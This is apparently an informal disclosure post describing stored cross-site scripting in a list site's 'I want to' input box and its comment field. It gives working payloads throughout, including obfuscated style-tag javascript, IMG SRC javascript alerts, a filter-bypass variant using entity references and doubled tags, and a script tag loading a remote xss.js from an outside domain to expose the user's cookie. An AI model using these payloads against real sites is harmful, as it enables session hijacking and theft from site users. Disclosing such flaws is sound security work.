XSS vuln via input text of the box "I want to____"

When you add an item thats already on your list. 

For a PoC we have style tags with broken up javascript. Put thisitem in your list once, and then using the "I want to:" put it again:

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

Now, in the same box even with no filter evasion we can even show our cookie. try putting:

<script src=http://www.youfucktard.com/xss.js></script>

And then, once again, like above, try putting it again in the same box.

Our cookie:

XSS via posting a comment.

Data here isn't properally sanatized here before being generated. We see that even with no filtering we can insert something like:
<IMG SRC=javascript:alert('XSS')>

and it will create our xss example.

However, it wont actually insert the comment, it will just execute it. So to bypass "malformed html found" error msg, we will use the numerial refference of <> which is &lt; and &gt;, along with double beginning and ending tags. For a PoC tryputting the code below as a comment:

&lt;<<IMG SRC=javascript:alert('We%20Bypassed%20the%20filter!')>>&gt;
